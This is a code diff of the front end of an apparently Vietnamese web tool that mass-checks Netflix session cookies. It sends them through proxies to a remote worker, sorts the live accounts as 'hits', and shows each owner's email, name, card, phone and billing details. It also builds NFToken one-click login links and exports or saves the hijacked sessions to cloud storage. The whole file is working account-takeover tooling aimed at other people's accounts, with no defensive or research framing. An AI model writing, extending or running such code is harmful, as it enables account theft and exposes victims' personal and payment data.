+async function startCheck(){
+  const workerUrl=(urlInput.value||localStorage.getItem('nf_worker_url')||'').trim().replace(/\/+$/, '');
+  if(!workerUrl){alert('Vui lòng nhập Worker URL.');return;}
+  const chunks=[];
+  for(const f of loadedFiles){ splitCookies(f.content).forEach(p=>chunks.push({raw:p,label:f.name})); }
+  const manual=document.getElementById('cookieInput').value.trim();
+  if(manual){ const parts=splitCookies(manual); parts.forEach((p,i)=>chunks.push({raw:p,label:parts.length>1?`#${i+1}`:'manual'})); }
+  if(!chunks.length){alert('Chưa có dữ liệu cookie.');return;}
+
+  const proxyList = getParsedProxies();
+
+  results=[]; counts={hit:0,free:0,hold:0,dead:0,err:0}; document.getElementById('results').innerHTML=''; updateStats();
+  document.getElementById('statsRow').style.display='flex'; document.getElementById('exportBar').style.display='none';
+  document.getElementById('progressWrap').style.display='block'; document.getElementById('progressLabel').style.display='block';
+
+  const btn=document.getElementById('checkBtn'); btn.disabled=true; btn.textContent='Đang check…'; running=true;
+  const cfg=getConfig();
+  chunks.forEach((c,i)=>{ results.push({id:i,raw:c.raw,label:c.label,status:'checking',info:null,nftoken:null,txt:null,netscape:null,error:null}); renderCard(results[i]); });
+
+  let idx=0;
+  async function runNext(){ 
+    while(idx<chunks.length){ 
+      const i=idx++; 
+      const proxy = proxyList.length > 0 ? proxyList[i % proxyList.length] : null;
+      await checkOne(workerUrl, i, chunks[i].raw, cfg, proxy); 
+      updateProgress(i+1,chunks.length); 
+    } 
   }
+  await Promise.all(Array.from({length:Math.min(5,chunks.length)},runNext));
+
+  btn.disabled=false; btn.textContent='▶ Check Cookie'; running=false; document.getElementById('progressLabel').textContent=`Hoàn tất — ${chunks.length} cookie.`;
+  if(results.some(r=>['hit','free','hold'].includes(r.status))) document.getElementById('exportBar').style.display='flex';
 }
 
-// ════════════════════════════════════════════
-// PROXY MANAGEMENT
-// ════════════════════════════════════════════
-async function loadProxies() {
-  const res = await apiFetch('/api/proxy');
-  if (res && res.ok) {
-    proxies = res.proxies || [];
-    renderProxyList();
+async function checkOne(wUrl, i, raw, cfg, proxyData = null){
+  try{
+    const token = localStorage.getItem('nf_app_token');
+    const payload = { cookie: raw, config: cfg };
+    if (proxyData) payload.proxy = proxyData;
+
+    const res=await fetch(wUrl,{ method:'POST', headers:{ 'Content-Type':'application/json', 'Authorization': `Bearer ${token}` }, body:JSON.stringify(payload) });
+    if (res.status === 401) { results[i].status='err'; results[i].error='Hết hạn phiên. Vui lòng F5.'; counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i); return; }
+    const data=await res.json();
+    if(!data.ok){ results[i].status=data.result==='EXPIRED'?'dead':'err'; results[i].error=data.error||data.reason||'Error'; }
+    else { const r=data.result; results[i].status = data.is_on_hold?'hold': r==='HIT_EXTRA'||r==='HIT'?'hit': r==='FREE'?'free':'dead'; results[i].info = data.info; results[i].nftoken= data.nftoken||null; results[i].txt = data.txt_file||null; results[i].netscape=data.netscape||null; }
+  }catch(e){ results[i].status='err'; results[i].error=e.message||'Network error'; }
+  counts[results[i].status]=(counts[results[i].status]||0)+1; updateStats(); refreshCard(i);
+}
+
+// LOGIC RECHECK CÁC COOKIE BỊ ERROR
+async function recheckErrors() {
+  const errorResults = results.filter(r => r.status === 'err');
+  if (errorResults.length === 0) return toast('Không có lỗi nào để recheck.');
+  
+  running = true;
+  document.getElementById('checkBtn').disabled = true;
+  const btnRecheck = document.getElementById('recheckErrorBtn');
+  btnRecheck.disabled = true;
+  btnRecheck.textContent = 'Đang Recheck...';
+  
+  const wUrl = urlInput.value || localStorage.getItem('nf_worker_url');
+  const cfg = getConfig();
+  const proxyList = getParsedProxies();
+  
+  let idx = 0;
+  async function runNext() {
+      while(idx < errorResults.length) {
+          const r = errorResults[idx++];
+          // Trừ lại số đếm thống kê cũ trước khi recheck
+          counts['err'] = Math.max(0, counts['err'] - 1);
+          
+          document.getElementById(`card-${r.id}`).classList.replace('err', 'checking');
+          document.getElementById(`card-${r.id}`).querySelector('.status-badge').innerHTML = '<span class="spinner"></span>';
+          
+          const proxy = proxyList.length > 0 ? proxyList[idx % proxyList.length] : null;
+          await checkOne(wUrl, r.id, r.raw, cfg, proxy);
+      }
   }
+  
+  await Promise.all(Array.from({length: Math.min(5, errorResults.length)}, runNext));
+  
+  running = false;
+  document.getElementById('checkBtn').disabled = false;
+  btnRecheck.disabled = false;
+  btnRecheck.textContent = '🔄 Recheck Lỗi';
+  toast('Recheck lỗi hoàn tất!');
 }
 
-function renderProxyList() {
-  const cont = document.getElementById('proxyList');
-  if (!proxies.length) {
-    cont.innerHTML = '<div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Chưa thêm proxy nào.</div>';
-    return;
+function updateProgress(d,t){ document.getElementById('progressBar').style.width=Math.round(d/t*100)+'%'; document.getElementById('progressLabel').textContent=`Đang check ${d}/${t}…`; }
+function updateStats(){ document.getElementById('sHit').textContent=counts.hit; document.getElementById('sFree').textContent=counts.free; document.getElementById('sHold').textContent=counts.hold; document.getElementById('sDead').textContent=counts.dead; document.getElementById('sErr').textContent=counts.err; }
+
+function renderCard(r){
+  const el=document.createElement('div'); el.className='result-card checking'; el.id=`card-${r.id}`;
+  el.innerHTML=`<div class="result-header" onclick="toggleDetail(${r.id})"><span class="status-badge"><span class="spinner"></span></span><span class="result-summary"><span class="dim">${esc(r.label)} — Đang quét…</span></span><button class="toggle-btn">▾</button></div><div class="result-detail" id="detail-${r.id}"></div>`;
+  document.getElementById('results').prepend(el);
+}
+
+function refreshCard(i){
+  const r=results[i]; const card=document.getElementById(`card-${r.id}`); if(!card) return; card.className=`result-card ${r.status}`;
+  const badges={hit:'✅ HIT',free:'🟡 FREE',hold:'⏸ ON HOLD',dead:'❌ EXPIRED',err:'⚠ ERROR'};
+  const sums={
+    hit: ()=>`${esc(r.info?.plan||'?')} <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.email||'')}</span>`,
+    free:()=>`Free Account <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.membership_status||'')}</span>`,
+    hold:()=>`On Hold <span class="dim">${esc(r.info?.country||'')} · ${esc(r.info?.plan||'')}</span>`,
+    dead:()=>`<span class="dim">${esc(r.error||'Cookie expired')}</span>`, err: ()=>`<span class="dim">${esc(r.error||'Error')}</span>`,
+  };
+  card.querySelector('.result-header').innerHTML=`<span class="status-badge">${badges[r.status]||r.status}</span><span class="result-summary">${sums[r.status]?.()??''}</span><button class="toggle-btn" onclick="event.stopPropagation();toggleDetail(${r.id})">▾</button>`;
+  card.querySelector('.result-header').onclick=()=>toggleDetail(r.id);
+  if(['hit','free','hold'].includes(r.status)){ buildDetail(r.id); document.getElementById(`detail-${r.id}`).classList.add('open'); }
+}
+
+function toggleDetail(id){ const d=document.getElementById(`detail-${id}`); if(!d.classList.contains('open')) buildDetail(id); d.classList.toggle('open'); }
+
+function getDetailHTML(r, isCloud = false) {
+  const info=r.info||{}; const cfg=getConfig(); const tf=cfg.txt_fields||{};
+  const FREE_HIDDEN=new Set(['member_since','next_billing','payment_method','card','phone','quality','max_streams','plan_price','extra_members','membership_status']);
+  const sub=['hit','hold'].includes(r.status);
+  const profileLabel=info.profile_count?`Profiles (${info.profile_count})`:'Profiles';
+
+  const ROWS=[
+    ['name','👤 Name'],['email','📧 Email'],['country','🌍 Country'],['plan','📦 Plan'],['member_since','📅 Member Since'],['next_billing','🗓️ Next Billing'],
+    ['payment_method','💳 Payment'],['card','💳 Card'],['phone','📱 Phone'],['quality','🎞️ Quality'],['max_streams','📺 Streams'],['plan_price','💰 Price'],
+    ['hold_status','⏸️ Hold Status'],['extra_members','👥 Extra Member'],['email_verified','✅ Email Verified'],['membership_status','🛡️ Membership Status'],
+    ['profiles',`🎭 ${profileLabel}`],['user_guid','🆔 User GUID']
+  ];
+  const rows=ROWS.filter(([k])=>{
+    if(!sub&&FREE_HIDDEN.has(k)) return false; if(k==='card'&&info.payment_method!=='CC') return false;
+    if(k==='extra_members'&&info.extra_members!=='Yes') return false; if(k==='hold_status'&&!['Yes','No'].includes(info.hold_status)) return false;
+    return tf[k]!==false;
+  });
+
+  const country=info.country||''; const flag=countryFlag(country);
+  const grid=rows.map(([k,l])=>{ let v=info[k]||'—'; if(k==='country'&&flag) v=`${v} ${flag}`; return `<div class="info-key">${l}</div><div class="info-val">${esc(v)}</div>`; }).join('');
+
+  let nftHtml=''; const nft=r.nftoken;
+  if(nft&&nft.token){
+    const t=nft.token; const exp=nft.expires_at_utc||'—';
+    const pcUrl=`https://netflix.com/?nftoken=${encodeURIComponent(t)}`; const mobUrl=`https://netflix.com/unsupported?nftoken=${encodeURIComponent(t)}`;
+    nftHtml=`<div class="nft-section"><div class="nft-title">🔑 NFToken</div><div class="nft-links"><a class="nft-link" href="${esc(pcUrl)}" target="_blank">🖥️ PC Login</a><a class="nft-link" href="${esc(mobUrl)}" target="_blank">📱 Phone Login</a></div><div class="nft-expiry">Valid Till (UTC): ${esc(exp)}</div></div>`;
   }
-  cont.innerHTML = proxies.map((p, idx) => `
-  <div class="proxy-card">
-    <div class="proxy-card-info">
-      <div class="proxy-card-raw">${esc(p.raw)}</div>
-      <div class="proxy-card-parsed">${p.parsed.protocol}://${p.parsed.host}:${p.parsed.port}${p.parsed.auth ? ` (auth: ${p.parsed.auth})` : ''}</div>
-    </div>
-    <div class="proxy-card-actions">
-      <button class="btn-sm" style="padding:4px 8px;font-size:10px;" onclick="setCurrentProxy('${p.id}')">✓ Use</button>
-      <button class="btn-sm" style="padding:4px 8px;font-size:10px;color:var(--red);border-color:var(--red);" onclick="deleteProxy('${p.id}')">✕</button>
-    </div>
-  </div>
-  `).join('');
 
-  if (currentProxy) {
-    const p = proxies.find(x => x.id === currentProxy);
-    const status = document.getElementById('currentProxyStatus');
-    if (status && p) {
-      status.innerHTML = `<span class="webhook-status-dot active"></span><span class="webhook-status-text">✓ ${esc(p.raw)}</span>`;
-    }
+  const dlName=`netflix_${country||'xx'}_${Date.now()}.txt`;
+  const dlContent=r.txt||buildFallbackTxt(r);
+  
+  let btns = `<button class="btn-action btn-copy" onclick="copyText(this,${JSON.stringify(r.netscape||'')})">📋 Copy Cookie</button><button class="btn-action btn-dl" onclick="dlFile(${JSON.stringify(dlName)},${JSON.stringify(dlContent)})">⬇ Save .txt</button>`;
+  if(!isCloud) btns += `<button class="btn-action" style="background:var(--blue-dim);border:1px solid var(--blue);color:var(--blue)" onclick="saveCookieToCloud(${r.id})">☁️ Lưu Cloud</button>`;
+  return `<div class="info-grid">${grid}</div>${nftHtml}<div class="action-row">${btns}</div>`;
+}
+
+function buildDetail(id){
+  const r=results[id]; const d=document.getElementById(`detail-${id}`); if(!r) return;
+  if(r.status==='err'||r.status==='dead'){ d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">${esc(r.error||'Cookie expired or invalid.')}</div>`; return; }
+  d.innerHTML = getDetailHTML(r, false);
+}
+
+function buildFallbackTxt(r){
+  const info=r.info||{}; const sub=['hit','hold'].includes(r.status);
+  const lines=[`NETFLIX ${sub?'HIT':'FREE'} :👇`,'',`Country: ${info.country||'UNKNOWN'}`,`Plan: ${info.plan||'UNKNOWN'}`,`Quality: ${info.quality||'UNKNOWN'}`,`Streams: ${info.max_streams||'UNKNOWN'}`,`Price: ${info.plan_price||'N/A'}`,`Email: ${info.email||'UNKNOWN'}`];
+  lines.push('','-'.repeat(98),'','Netflix COOKIE :👇','',(r.netscape||'').trim(),''); return lines.join('\n');
+}
+
+function exportTxt(type){
+  const f=type==='all'?results.filter(r=>['hit','free','hold'].includes(r.status)):results.filter(r=>r.status===type);
+  if(!f.length){toast('Không có kết quả.');return;} const sep='\n\n'+'='.repeat(98)+'\n\n'; dlFile(`netflix_${type}_${Date.now()}.txt`,f.map(r=>r.txt||buildFallbackTxt(r)).join(sep));
+}
+function dlFile(name,content){ const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([content],{type:'text/plain'})); a.download=name; a.click(); }
+function countryFlag(code){ if(!code||code.length!==2) return ''; return[...code.toUpperCase()].map(c=>String.fromCodePoint(127397+c.charCodeAt(0))).join(''); }
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function copyText(btn,text){ navigator.clipboard.writeText(text).then(()=>{ btn.textContent='✓ Copied!'; btn.classList.add('copied'); setTimeout(()=>{ btn.textContent='📋 Copy Cookie'; btn.classList.remove('copied'); },1800); }); }
+function clearAll(){
+  if(running) return; document.getElementById('cookieInput').value=''; document.getElementById('results').innerHTML='';
+  document.getElementById('statsRow').style.display='none'; document.getElementById('exportBar').style.display='none';
+  document.getElementById('progressWrap').style.display='none'; document.getElementById('progressLabel').style.display='none';
+  loadedFiles=[]; renderFileTags(); results=[]; counts={hit:0,free:0,hold:0,dead:0,err:0}; updateStats();
+}
+function toast(msg){
+  const t=document.createElement('div'); Object.assign(t.style,{position:'fixed',bottom:'20px',left:'50%',transform:'translateX(-50%)', background:'#222',border:'1px solid #444',color:'#eee',padding:'8px 18px',borderRadius:'4px',fontSize:'12px',zIndex:'99999'});
+  t.textContent=msg; document.body.appendChild(t); setTimeout(()=>{t.remove();},2000);
+}
+
+// ════ CLOUD STORAGE LOGIC ════
+async function apiFetch(endpoint, method = 'GET', body = null) {
+  const wUrl = localStorage.getItem('nf_worker_url'); const token = localStorage.getItem('nf_app_token');
+  if(!wUrl || !token) return null; const opts = { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` } };
+  if(body) opts.body = JSON.stringify(body);
+  try { const r = await fetch(`${wUrl}${endpoint}`, opts); return await r.json(); } catch(e) { return { ok: false, error: e.message }; }
+}
+
+async function saveCookieToCloud(id) {
+  const r = results[id]; if(!r) return; toast('Đang đẩy dữ liệu lên Cloud...');
+  const label = r.info?.email || r.label || 'Saved Cookie';
+  const res = await apiFetch('/api/cloud/cookies', 'POST', { netscape: r.netscape, label: label, status: r.status, info: r.info, nftoken: r.nftoken });
+  if(res && res.ok) toast('Đã lưu thành công vào Cloudflare KV ✓'); else toast(`Thất bại: ${res?.error || 'Lỗi'}`);
+}
+
+async function saveAllHitsToCloud() {
+  const hits = results.filter(r => r.status === 'hit' || r.status === 'hold');
+  if (!hits.length) return toast('Không có tài khoản HIT hoặc HOLD nào để lưu!');
+  const btn = document.querySelector('button[onclick="saveAllHitsToCloud()"]');
+  const originalText = btn.innerHTML; btn.innerHTML = '<span class="spinner" style="border-top-color:var(--blue)"></span> Đang lưu...'; btn.disabled = true;
+  let success = 0; let failed = 0;
+  for (const r of hits) {
+    const label = r.info?.email || r.label || 'Saved Cookie';
+    const res = await apiFetch('/api/cloud/cookies', 'POST', { netscape: r.netscape, label: label, status: r.status, info: r.info, nftoken: r.nftoken });
+    if (res && res.ok) success++; else failed++;
   }
+  btn.innerHTML = originalText; btn.disabled = false;
+  toast(`Hoàn tất! Lưu mới: ${success} | Bỏ qua (Trùng/Lỗi): ${failed}`);
+  loadCloudCookies();
 }
 
-async function addProxy() {
-  const proxyInput = document.getElementById('proxyInput').value.trim();
-  if (!proxyInput) { toast('Nhập proxy'); return; }
-
-  const res = await apiFetch('/api/proxy', 'POST', { proxy: proxyInput });
-  if (res && res.ok) {
-    document.getElementById('proxyInput').value = '';
-    toast('Thêm proxy thành công');
-    loadProxies();
-  } else {
-    toast(`Lỗi: ${res?.error || 'Invalid proxy format'}`);
-  }
-}
-
-function setCurrentProxy(id) {
-  currentProxy = id;
-  renderProxyList();
-  toast('✓ Proxy đã được chọn');
-}
-
-async function deleteProxy(id) {
-  if (!confirm('Xóa proxy này?')) return;
-  const res = await apiFetch(`/api/proxy/${id}`, 'DELETE');
-  if (res && res.ok) {
-    if (currentProxy === id) currentProxy = null;
-    toast('Đã xóa');
-    loadProxies();
-  }
-}
-
-// ════════════════════════════════════════════
-// COOKIE CHECKING
-// ════════════════════════════════════════════
-async function checkCookie(cookieText = null) {
-  if (isChecking) return;
-  isChecking = true;
-
-  const rawCookie = cookieText || document.getElementById('cookieInput').value.trim();
-  if (!rawCookie) { toast('Nhập cookie'); isChecking = false; return; }
-
-  const cfg = await getConfig();
-  const token = localStorage.getItem('nf_app_token');
-  if (!token) { toast('Chưa đăng nhập'); isChecking = false; return; }
-
-  results = [];
-  renderResults();
-
-  const wUrl = localStorage.getItem('nf_worker_url');
-  if (!wUrl) { toast('Chưa setup Worker URL'); isChecking = false; return; }
-
-  try {
-    showProgress();
-    const res = await fetch(wUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${token}`
-      },
-      body: JSON.stringify({ cookie: rawCookie, config: cfg })
-    });
-
-    const data = await res.json();
-    hideProgress();
-
-    if (data.ok) {
-      results.push({
-        status: data.result === 'HIT' || data.result === 'HIT_EXTRA' ? 'hit' : data.result === 'FREE' ? 'free' : 'dead',
-        email: data.info?.email || 'Unknown',
-        plan: data.info?.plan || 'Unknown',
-        country: data.info?.country || 'N/A',
-        data: data
-      });
-      
-      // Save to cloud
-      await apiFetch('/api/cloud/cookies', 'POST', {
-        label: `${data.info?.email || 'Cookie'} (${data.info?.plan || 'Unknown'})`,
-        netscape: data.netscape,
-        status: results[0].status,
-        info: data.info,
-        nftoken: data.nftoken
-      });
-    } else {
-      results.push({
-        status: 'err',
-        email: 'ERROR',
-        plan: data.reason || 'Unknown error',
-        country: 'N/A',
-        error: data.error || 'Check failed'
-      });
-    }
-
-    renderResults();
-  } catch(e) {
-    hideProgress();
-    results.push({
-      status: 'err',
-      email: 'ERROR',
-      plan: 'Network Error',
-      country: 'N/A',
-      error: e.message
-    });
-    renderResults();
-  } finally {
-    isChecking = false;
-  }
-}
-
-function showProgress() {
-  document.querySelector('.progress-wrap').style.display = 'block';
-  document.querySelector('.progress-label').style.display = 'block';
-}
-
-function hideProgress() {
-  document.querySelector('.progress-wrap').style.display = 'none';
-  document.querySelector('.progress-label').style.display = 'none';
-}
-
-function renderResults() {
-  const cont = document.getElementById('results');
-  if (!results.length) { cont.innerHTML = ''; return; }
-
-  cont.innerHTML = results.map((r, idx) => {
-    const isBad = r.status === 'err' || r.status === 'dead';
-    return `
-    <div class="result-card ${r.status}" id="result-${idx}">
-      <div class="result-header" onclick="toggleDetail(${idx})">
-        <div style="display:flex;gap:10px;align-items:center;overflow:hidden;flex:1">
-          <span class="status-badge">${r.status.toUpperCase()}</span>
-          <span class="result-summary">${esc(r.email)} <span class="dim">· ${esc(r.plan)}</span></span>
-        </div>
-        <div class="result-actions">
-          ${isBad ? `<button class="btn-action" style="color:var(--green);border-color:var(--green);padding:4px 8px;" onclick="event.stopPropagation(); recheckOne(${idx})">🔄 Recheck</button>` : ''}
-          <button class="toggle-btn" onclick="event.stopPropagation(); toggleDetail(${idx})">▾</button>
-        </div>
-      </div>
-      <div class="result-detail" id="detail-${idx}"></div>
-    </div>
-    `;
-  }).join('');
-}
-
-function toggleDetail(idx) {
-  const detail = document.getElementById(`detail-${idx}`);
-  if (!detail.classList.contains('open')) {
-    const r = results[idx];
-    if (r.error) {
-      detail.innerHTML = `<div class="result-detail-item"><span style="color:var(--red)">${esc(r.error)}</span></div>`;
-    } else if (r.data) {
-      const info = r.data.info || {};
-      detail.innerHTML = `
-        <div class="result-detail-item"><span class="result-detail-label">Email:</span><span class="result-detail-value">${esc(info.email || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Tên:</span><span class="result-detail-value">${esc(info.name || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Quốc gia:</span><span class="result-detail-value">${esc(info.country || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Plan:</span><span class="result-detail-value">${esc(info.plan || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Điểm dừng:</span><span class="result-detail-value">${esc(info.member_since || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Thanh toán tiếp theo:</span><span class="result-detail-value">${esc(info.next_billing || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Profile:</span><span class="result-detail-value">${esc(info.profile_count || 'N/A')}</span></div>
-        ${r.data.nftoken ? `<div class="result-detail-item"><span class="result-detail-label">NFToken:</span><span class="result-detail-value" style="color:var(--green)">✓ Có</span></div>` : ''}
-      `;
-    }
-  }
-  detail.classList.toggle('open');
-}
-
-async function recheckOne(idx) {
-  if (!results[idx].data) return;
-  const card = document.getElementById(`result-${idx}`);
-  if (card) card.querySelector('.status-badge').innerHTML = '<span class="spinner"></span>';
-
-  const cfg = await getConfig();
-  const wUrl = localStorage.getItem('nf_worker_url');
-  const token = localStorage.getItem('nf_app_token');
-
-  try {
-    const res = await fetch(wUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${token}`
-      },
-      body: JSON.stringify({ cookie: results[idx].data.netscape, config: cfg })
-    });
-
-    const data = await res.json();
-    if (data.ok) {
-      results[idx].status = data.result === 'HIT' || data.result === 'HIT_EXTRA' ? 'hit' : data.result === 'FREE' ? 'free' : 'dead';
-      results[idx].data = data;
-      toast('✓ Recheck xong');
-    } else {
-      results[idx].status = 'err';
-      results[idx].error = data.error || 'Recheck failed';
-      toast('✗ Recheck thất bại');
-    }
-    renderResults();
-  } catch(e) {
-    results[idx].status = 'err';
-    results[idx].error = e.message;
-    toast('✗ Recheck lỗi');
-    renderResults();
-  }
-}
-
-// ════════════════════════════════════════════
-// CLOUD COOKIES
-// ════════════════════════════════════════════
 async function loadCloudCookies() {
+  const cont = document.getElementById('cloudResults');
+  cont.innerHTML = '<div style="text-align:center;padding:20px;"><span class="spinner"></span> Đang đồng bộ hóa...</div>';
   const res = await apiFetch('/api/cloud/cookies');
-  if (res && res.ok) {
-    cloudCookies = res.data || [];
-    renderCloudList();
-  }
+  if(res && res.ok) { cloudCookies = res.data; renderCloudList(); } else { cont.innerHTML = `<div style="color:var(--red);text-align:center;padding:20px;">Không thể tải dữ liệu.</div>`; }
 }
 
 function renderCloudList() {
   const cont = document.getElementById('cloudResults');
-  if(!cloudCookies.length) {
-    cont.innerHTML = '<div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Kho lưu trữ trống.</div>';
-    return;
-  }
+  if(!cloudCookies.length) { cont.innerHTML = '<div style="text-align:center;font-size:11px;color:var(--muted);padding:20px;">Kho lưu trữ trống.</div>'; return; }
   cont.innerHTML = cloudCookies.map((c, idx) => {
     const badge = c.status === 'hit' ? '<span style="color:var(--green)">✅ HIT</span>' : c.status === 'free' ? '<span style="color:var(--gold)">🟡 FREE</span>' : c.status === 'hold' ? '<span style="color:var(--hold)">⏸ HOLD</span>' : '<span style="color:var(--red)">❌ DEAD</span>';
     const checkDate = c.lastCheck ? new Date(c.lastCheck).toLocaleString() : new Date(c.savedAt).toLocaleString();
@@ -497,85 +757,23 @@ function renderCloudList() {
           <span class="result-summary">${esc(c.info?.plan || 'Free Account')} <span class="dim">· ${esc(c.info?.email || c.label)}</span></span>
         </div>
         <div style="display:flex;gap:5px;flex-shrink:0;">
-          <button class="btn-action" style="color:var(--green);border-color:var(--green);padding:4px 8px;" onclick="event.stopPropagation(); recheckCloudCookie(${idx})">🔄 Recheck</button>
-          <button class="btn-action" style="color:var(--red);border-color:var(--red);padding:4px 8px;" onclick="event.stopPropagation(); deleteCloudCookie('${c.id}')">✕ Xoá</button>
+          <button class="btn-action" style="color:var(--red);border-color:var(--red);padding:5px 9px;" onclick="event.stopPropagation(); deleteCloudCookie('${c.id}')">✕ Xoá</button>
+          <button class="toggle-btn" onclick="event.stopPropagation(); toggleCloudDetail(${idx})">▾</button>
         </div>
       </div>
       <div class="result-detail" id="cloud-detail-${c.id}"></div>
-      <div style="padding:0 16px 12px 16px;font-size:10px;color:var(--muted)">Check lần cuối: ${checkDate}</div>
+      <div style="padding:0 16px 12px 16px;font-size:10px;color:var(--muted)">Đồng bộ cuối: ${checkDate}</div>
     </div>`;
   }).join('');
 }
 
 function toggleCloudDetail(idx) {
-  const c = cloudCookies[idx];
-  const d = document.getElementById(`cloud-detail-${c.id}`);
+  const c = cloudCookies[idx]; const d = document.getElementById(`cloud-detail-${c.id}`);
   if(!d.classList.contains('open')) {
-    if(c.status === 'dead' || c.status === 'err') {
-      d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">Cookie expired or invalid. Use Recheck to verify.</div>`;
-    } else {
-      const info = c.info || {};
-      d.innerHTML = `
-        <div class="result-detail-item"><span class="result-detail-label">Email:</span><span class="result-detail-value">${esc(info.email || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Tên:</span><span class="result-detail-value">${esc(info.name || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Quốc gia:</span><span class="result-detail-value">${esc(info.country || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Plan:</span><span class="result-detail-value">${esc(info.plan || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Điểm dừng:</span><span class="result-detail-value">${esc(info.member_since || 'N/A')}</span></div>
-        <div class="result-detail-item"><span class="result-detail-label">Thanh toán tiếp theo:</span><span class="result-detail-value">${esc(info.next_billing || 'N/A')}</span></div>
-        ${c.nftoken ? `<div class="result-detail-item"><span class="result-detail-label">NFToken:</span><span class="result-detail-value" style="color:var(--green)">✓ ${esc(c.nftoken.substring(0, 20))}...</span></div>` : ''}
-      `;
-    }
+    if(c.status === 'dead' || c.status === 'err') d.innerHTML=`<div style="padding:12px 0;font-size:12px;color:var(--muted)">Cookie expired or invalid.</div>`;
+    else d.innerHTML = getDetailHTML(c, true); 
   }
   d.classList.toggle('open');
-}
-
-async function recheckCloudCookie(idx) {
-  const c = cloudCookies[idx];
-  const card = document.getElementById(`cloud-card-${c.id}`);
-  if (card) card.querySelector('.status-badge').innerHTML = '<span class="spinner"></span>';
-
-  const cfg = await getConfig();
-  const wUrl = localStorage.getItem('nf_worker_url');
-  const token = localStorage.getItem('nf_app_token');
-
-  try {
-    const res = await fetch(wUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${token}`
-      },
-      body: JSON.stringify({ cookie: c.netscape, config: cfg })
-    });
-
-    const data = await res.json();
-    let newStatus = 'dead';
-    let newInfo = c.info;
-    let newNftoken = c.nftoken;
-
-    if (data.ok) {
-      newStatus = data.is_on_hold ? 'hold' : data.result === 'HIT' || data.result === 'HIT_EXTRA' ? 'hit' : data.result === 'FREE' ? 'free' : 'dead';
-      if (data.info) newInfo = data.info;
-      if (data.nftoken) newNftoken = data.nftoken;
-    }
-
-    cloudCookies[idx].status = newStatus;
-    cloudCookies[idx].info = newInfo;
-    cloudCookies[idx].nftoken = newNftoken;
-    cloudCookies[idx].lastCheck = Date.now();
-
-    await apiFetch('/api/cloud/cookies/update', 'POST', {
-      id: c.id,
-      status: newStatus,
-      info: newInfo,
-      nftoken: newNftoken
-    });
-
-    toast('✓ Recheck xong');
-    renderCloudList();
-  } catch(e) {
-    toast('✗ Recheck lỗi');
-  }
 }
 
 async function deleteCloudCookie(id) {
@@ -586,259 +784,70 @@ async function deleteCloudCookie(id) {
 
 async function recheckAllCloud() {
   if(!cloudCookies.length) return toast("Không có cookie trong kho");
-  toast('Bắt đầu Recheck tất cả...');
-  
+  const wUrl = localStorage.getItem('nf_worker_url'); const token = localStorage.getItem('nf_app_token'); const cfg = getConfig();
+  toast('Bắt đầu Recheck tự động...');
   for(let i=0; i<cloudCookies.length; i++) {
-    await recheckCloudCookie(i);
-    await new Promise(r => setTimeout(r, 300));
+    const c = cloudCookies[i]; const card = document.getElementById(`cloud-card-${c.id}`);
+    if(card) card.querySelector('.status-badge').innerHTML = '<span class="spinner"></span>';
+    try {
+      const res = await fetch(wUrl, { method:'POST', headers:{ 'Content-Type':'application/json', 'Authorization': `Bearer ${token}` }, body:JSON.stringify({cookie:c.netscape, config:cfg}) });
+      const data = await res.json();
+      let newStatus = 'dead'; let newInfo = c.info; let newNftoken = c.nftoken;
+      if(data.ok) {
+        newStatus = data.is_on_hold ? 'hold' : data.result === 'HIT' ? 'hit' : data.result === 'FREE' ? 'free' : 'dead';
+        if(data.info) newInfo = data.info; if(data.nftoken) newNftoken = data.nftoken;
+      }
+      cloudCookies[i].status = newStatus; cloudCookies[i].info = newInfo; cloudCookies[i].nftoken = newNftoken; cloudCookies[i].lastCheck = Date.now();
+      await apiFetch('/api/cloud/cookies/update', 'POST', { id: c.id, status: newStatus, info: newInfo, nftoken: newNftoken });
+      renderCloudList();
+    } catch(e) { if(card) card.querySelector('.status-badge').innerHTML = '⚠ ERR'; }
   }
-  
   toast("Recheck hoàn tất!");
 }
 
-// ════════════════════════════════════════════
-// AUTH & INIT
-// ════════════════════════════════════════════
-async function handleAuth() {
-  const tab = document.querySelector('[data-tab="auth"]');
-  if (!tab) return;
-
-  const username = prompt('Username (Enter để bỏ qua):') || '';
-  const password = prompt('Password:') || '';
-
-  if (!password) { toast('Hủy đăng nhập'); return; }
-
-  const wUrl = localStorage.getItem('nf_worker_url');
-  if (!wUrl) { toast('Chưa setup Worker URL'); return; }
-
-  try {
-    const res = await fetch(`${wUrl}/auth/login`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
-    });
-    const data = await res.json();
-
-    if (data.ok) {
-      localStorage.setItem('nf_app_token', data.token);
-      toast(`✓ Đăng nhập thành công (${data.isAdmin ? 'Admin' : 'User'})`);
-      location.reload();
-    } else {
-      toast(`✗ ${data.error}`);
-    }
-  } catch(e) {
-    toast(`✗ Lỗi: ${e.message}`);
-  }
